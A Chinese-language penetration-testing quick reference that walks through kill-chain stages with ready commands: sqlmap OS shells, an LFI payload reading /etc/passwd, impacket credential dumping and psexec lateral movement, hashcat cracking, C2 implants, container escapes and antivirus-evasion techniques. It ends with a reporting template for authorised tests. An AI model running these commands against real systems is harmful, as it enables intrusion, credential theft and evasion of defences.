# Kill Chain 各阶段速查

每个阶段给出：目的 → 常用命令 → 产出 → 进入下一阶段的判据。

---

## 1. 侦察 / 信息收集

**目的**：在不惊动目标的前提下，尽可能摸清资产边界。

```bash
# 子域枚举
subfinder -d target.com -all -o subs.txt
# 存活探测 + 指纹
httpx -l subs.txt -sc -title -tech-detect -o live.txt
# 被动情报
whois target.com
```

**产出**：`subs.txt`、`live.txt`。
**判据**：存活 Web 资产清单成型，可进入测绘。

---

## 2. 测绘 / 枚举

**目的**：把攻击面画全——端口、服务、目录、参数。

```bash
# 端口
nmap -sV -sC -T4 -p- target -oA nmap_full
masscan -p1-65535 --rate=1000 target -oL masscan.out
# 目录 / 文件
dirsearch -u http://target -e php,asp,aspx,jsp,html -x 404
ffuf -u http://target/FUZZ -w /usr/share/wordlists/dirb/common.txt -fc 404
# 参数发现
ffuf -u "http://target/page.php?FUZZ=1" -w params.txt -fs 0
```

**产出**：端口表、服务版本、目录树、隐藏参数。
**判据**：拿到可交互的入口点（登录框、上传点、API、参数位）。

---

## 3. 漏洞验证

**目的**：对候选点做**最小化**验证，确认可利用性再升级，不盲打。

```bash
# 自动化扫描
nuclei -l live.txt -t cves/ -severity critical,high -o nuclei.out
# SQLi
sqlmap -u "http://target/x.php?id=1" --batch --dbs
sqlmap -r req.txt --batch --level=5 --risk=3 --os-shell
# 目录穿越 / 文件包含
# LFI:  http://target/?file=../../../../etc/passwd
# SSTI: http://target/?name={{7*7}}      -> 回显 49 即命中
# SSRF: 用 dnslog / collaborator 带外确认
```

**产出**：确认漏洞清单（类型 + 利用点 + 证据）。
**判据**：至少一个高危可被打点。

---

## 4. POC 链编排 / 打点

**目的**：串联漏洞形成利用链，拿初始立足点。

- 组合思路：信息泄露 → 凭证 → 登录 → 上传/注入 → RCE。
- 每一步都留证据（请求/响应），失败可回退到上一步换路径。
- 拿到 shell 后先做环境判断（`id;whoami;uname -a;hostname`）。

**判据**：获得可执行的命令执行 / 文件读写立足点。

---

## 5. 权限维持 / 内网横向

```bash
# 隧道 / 代理（视环境）
# 内网探测
nmap -sn 10.0.0.0/24
# 域信息（impacket）
impacket-GetADUsers -all domain/user:pass -dc-ip 10.0.0.10
impacket-GetUserSPNs domain/user:pass -dc-ip 10.0.0.10 -request
# 横向：psexec / wmiexec / smbexec
impacket-psexec domain/admin:pass@10.0.0.20
```

**判据**：内网拓扑清晰，至少一台新主机可控。

---

## 6. 提权 / 凭证获取

```bash
# Linux 提权枚举
linpeas.sh
uname -a; sudo -l; find / -perm -4000 2>/dev/null
# Windows 提权枚举
winpeas.exe
whoami /priv
# 凭证 dump
impacket-secretsdump domain/admin:pass@10.0.0.20
# 离线破解
hashcat -m 1000 ntlm.hash wordlist.txt
hashcat -m 1800 sha512crypt.hash wordlist.txt
```

**判据**：获得高权限会话和 / 或可复用凭证。

---

## 7. C2 / 云 / 容器

```bash
# Sliver C2 上线
# sliver-server -> generate -> mtls/https implant
# 云：AK/SK 泄露后枚举
# aws sts get-caller-identity
# 容器逃逸常见面：privileged 容器、docker.sock 挂载、
#   CVE-2022-0492(cgroup)、cve-2019-5736(runc)
# 判断：ls -la /var/run/docker.sock；capsh --print
```

**判据**：C2 通道稳定，或拿到宿主机 / 云环境控制面。

---

## 8. 免杀规避

- 载荷编码 / 混淆、内存加载、分离免杀、白利用、签名伪造。
- 每次改动后本地过一遍杀软/EDR 行为验证，再投递。
- 与目标的 AV 版本对齐测试，不盲目堆技巧。

---

## 9. 报告输出

按 `reporting.md` 模板落盘 MD，再转 PDF。至少包含：
目标与范围、攻击路径图、复现步骤、证据截图、风险评级、修复建议。
